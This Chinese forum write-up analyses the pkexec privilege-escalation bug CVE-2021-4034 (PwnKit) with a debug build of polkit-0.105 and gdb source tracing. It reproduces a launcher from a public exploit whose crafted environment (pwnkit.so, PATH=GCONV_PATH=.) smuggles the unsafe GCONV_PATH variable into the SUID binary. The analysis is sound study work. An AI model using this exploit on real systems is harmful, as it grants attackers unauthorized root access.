
`gcc -g -O0 -o test main.c`
`chmod 4755 ./test`

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_Z2WNRN8ZFQ397DQ.png)

设置环境变量，并通过 test 程序打印出来，用以判断环境变量的导入情况

run.sh

```bash
#!/bin/bash
export GCONV_PATH=AAAA0001
export GETCONF_DIR=AAAA0002
export HOSTALIASES=AAAA0003
export LD_AUDIT=AAAA0004
export LD_DEBUG=AAAA0005
export LD_DEBUG_OUTPUT=AAAA0006
export LD_DYNAMIC_WEAK=AAAA0007
export LD_HWCAP_MASK=AAAA0008
export LD_LIBRARY_PATH=AAAA0009
export LD_ORIGIN_PATH=AAAA0010
export LD_PRELOAD=AAAA0011
export LD_PROFILE=AAAA0012
export LD_SHOW_AUXV=AAAA0013
export LD_USE_LOAD_BIAS=AAAA0014
export LOCALDOMAIN=AAAA0015
export LOCPATH=AAAA0016
export MALLOC_TRACE=AAAA0017
export NIS_PATH=AAAA0018
export NLSPATH=AAAA0019
export RESOLV_HOST_CONF=AAAA0020
export RES_OPTIONS=AAAA0021
export TMPDIR=AAAA0022
export TZDIR=AAAA0023
export PATH=AAAA1001:/usr/bin
export SHELL=AAAA1002
export CHARSET=AAAA1003
export BBBB=AAAA1004
./test
```

分别以 root 用户和 kali 用户执行 `./run.sh |grep AAAA`，用来判断环境变量的导入情况。

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_K2XY8UPGKFF2CHD.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_E43KVDVKUJ5A8G8.png)

通过实验可以知道，当以 kali 用户身份去执行所有者为 root 且具有 SUID 权限的程序时，`GCONV_PATH`、`LD_PRELOAD` 等不安全的环境变量并不会被引入。

# 利用原理分析

## 构建 pkexec 源码调试环境

### 下载源码 polkit-0.105

[e85K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7X3y4Q4x3X3g2X3k6h3c8G2M7X3q4H3M7X3!0B7k6h3y4@1i4K6u0W2L8%4u0Y4i4K6u0r3M7X3g2H3L8#2)9J5c8Y4m8C8k6%4y4Q4x3V1k6H3L8$3I4C8K9i4c8Q4x3V1k6H3L8$3I4C8K9i4c8Q4x3X3b7H3i4K6u0W2x3e0l9#2i4K6u0W2N6r3q4J5i4K6u0W2k6%4A6Q4x3V1k6E0k6o6g2Q4x3V1j5&6j5K6t1&6k6e0q4T1y4X3x3J5x3e0c8X3x3r3u0V1y4X3j5I4k6o6c8W2k6e0x3H3x3$3c8X3j5h3g2V1z5g2)9J5c8Y4m8G2L8r3E0A6N6q4)9J5k6o6m8Q4x3X3f1I4x3o6g2Q4x3X3g2@1j5i4u0Q4x3X3g2Y4P5R3`.`.](https://bbs.kanxue.com/elink@14dK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6M7X3y4Q4x3X3g2X3k6h3c8G2M7X3q4H3M7X3!0B7k6h3y4@1i4K6u0W2L8%4u0Y4i4K6u0r3M7X3g2H3L8#2)9J5c8Y4m8C8k6%4y4Q4x3V1k6H3L8$3I4C8K9i4c8Q4x3V1k6H3L8$3I4C8K9i4c8Q4x3X3b7H3i4K6u0W2x3e0l9#2i4K6u0W2N6r3q4J5i4K6u0W2k6%4A6Q4x3V1k6E0k6o6g2Q4x3V1j5&6j5K6t1&6k6e0q4T1y4X3x3J5x3e0c8X3x3r3u0V1y4X3j5I4k6o6c8W2k6e0x3H3x3$3c8X3j5h3g2V1z5g2)9J5c8Y4m8G2L8r3E0A6N6q4)9J5k6o6m8Q4x3X3f1I4x3o6g2Q4x3X3g2@1j5i4u0Q4x3X3g2Y4P5R3`.`.)

### 安装编译环境

```bash
apt install automake
apt install autopoint
apt install libtool
apt install gtk-doc-tools
apt install libpam0g-dev
apt install intltool
```

### 编译

```bash
./configure
make
```
注：要把 `-O2` 换成 `-O0`，关闭优化，方便调试

### 设置 SUID 权限

以 root 用户赋权

```bash
cd src/programs/.libs
chmod 4755 pkexec
```

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_4JNPKRYT6ZTYPH8.png)

### 修改利用脚本 berdav/CVE-2021-4034

修改利用脚本里调用的程序为刚编译好的 pkexec，以便源码调试。

cve-2021-4034.c

```c
#include <unistd.h>
int main(int argc, char **argv)
{
char * const args[] = {
NULL
};
char * const environ[] = {
"pwnkit.so:.",
"PATH=GCONV_PATH=.",
"SHELL=/lol/i/do/not/exists",
"CHARSET=PWNKIT",
"GIO_USE_VFS=",
NULL
};
return execve("../polkit-0.105/src/programs/.libs/pkexec", args, environ);
}
```

## gdb 调试

### pkexec 的授权认证是如何被绕过的

`./pkexec bash` 是正常的用法，会先请求授权，然后再以 root 权限执行 bash 命令；而 `./cve-2021-4034` 会利用漏洞，跳过授权认证，直接以 root 权限执行命令。授权认证是如何被绕过的呢？

如果能在源码层次记录下两个程序的执行流程，则可以比对出有差异的地方，从而帮助我们理解“授权认证是如何被绕过”这个问题，更直观的理解漏洞利用过程。

#### gdb 源码追踪脚本

step_trace.py

```python
import sys
import gdb
import os
import re

def in_frames(needle):
    """ Check if the passed frame is still on the current stack """
    hay = gdb.newest_frame()
    while hay:
        if hay == needle:
            return True
        hay = hay.older()
    return False

# Use this to reduce any kind of unwanted noise
def filter_step(output):
    output = re.sub(r'^.*No such file or directory\.\n', r'', output, flags=re.M)
    output = re.sub(r'^\d+\s+in\s+.*\n', r'', output, flags=re.M)
    return output

def step_trace(filename=None, step="step"):
    counter = 0
    if filename:
        output = ""
    frame = gdb.newest_frame()
    print("Stepping until end of {} @ {}:{}".format(frame.name(), frame.function().symtab, frame.function().line))
    while in_frames(frame):
        counter += 1
        if filename:
            output += filter_step(gdb.execute(step, to_string=True))
        else:
            gdb.execute(step)

    if filename:
        with open(filename, "w") as file:
            file.write(output)
        print("Done stepping through {} lines.".format(counter))
```

```bash
(gdb) source step_trace.py
(gdb) python step_trace(step="next")
```

step_trace.py 是 gdb 的源码追踪脚本，可以把执行过的代码打印到终端上。其中，`step="next"` 表示单步步过，`step="step"` 表示单步步入。

#### 调试 "./pkexec bash"

bplist

```bash
set follow-fork-mode parent
b main
b /home/kali/software/relase/polkit-0.105/src/programs/pkexec.c:900
r bash
source step_trace.py
python step_trace(step="next")
```

在 pkexec 的 main 函数和调用 execv `pkexec.c:900` 时下断点，记录中间的源码调用。在调试过程中，可以知道授权弹窗在 705 行代码 `polkit_authority_check_authorization_sync` 处调用。另外，step_trace.py 把源码追踪的结果打印在了终端，可以通过复制的方式另存为 gdb_pkexec_bash.log，以便后面的分析。

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_S4URMMZTS4KHBE2.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_QFWTKA2EFR4EMW7.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_TB4T8ZZW2UXCB6N.png)

#### 调试 "./cve-2021-4034"

bplist_cve

```bash
b main
r
c
b /home/kali/software/release/polkit-0.105/src/programs/pkexec.c:900
set follow-fork-mode parent
source /home/kali/software/release/polkit-0.105/src/programs/.libs/step_trace.py
python step_trace(step="next")
```

源码追踪 `./cve-2021-4034` 的执行，并把日志记录为 gdb_cve-2021-4034.log，以便后面的分析。

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_ZC7CGGHY5QQ4PHJ.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_AHR9MN8R7XFPXXE.png)

#### 代码流日志比对

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_TJUP6U9EKRTM4RV.png)

通过比对代码流日志，可以清晰的看到 `./cve-2021-4034` 对 argc 的处理和 `validate_environment_variable` 的行为上存在异常，发现这两点异常将十分有助于我们理解漏洞利用过程。`./cve-2021-4034` 的代码流程非常的短，其在调用环境变量校验函数 `validate_environment_variable` 的时候就获得了 shell，这也就解释了为何会绕过授权认证，因为根本就没走到那。

### 如何获取 shell 权限的

通过 gdb 调试，可以打印一些关键变量的值，并给 gdb_cve-2021-4034.log 加上备注，这样有助于理解漏洞利用过程。

#### 深入调试 "./cve-2021-4034"

bp

```bash
b main
r
c
b /home/kali/software/release/polkit-0.105/src/programs/pkexec.c:593
set follow-fork-mode parent
```

```bash
gdb ./cve-2021-4034 -x bp
```

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_3VB3GD5CRJMC7CW.png)

由图可知，参数数组与环境变量数组在内存布局上是连续的，本例中，`argv[1]` 即是 `environ[0]`

![图片描述](https://bbs.kanxue.com/upload/attach/202202/598931_KYHCV4PHQ7YMC5G.png)

s 被赋值为 `"GCONV_PATH=./pwnkit.so:."`，在 pkexec 程序看来，这只是一个普通的文件路径，而这是攻击者特意构造的，是为了引入不安全的环境变量 `GCONV_PATH`。
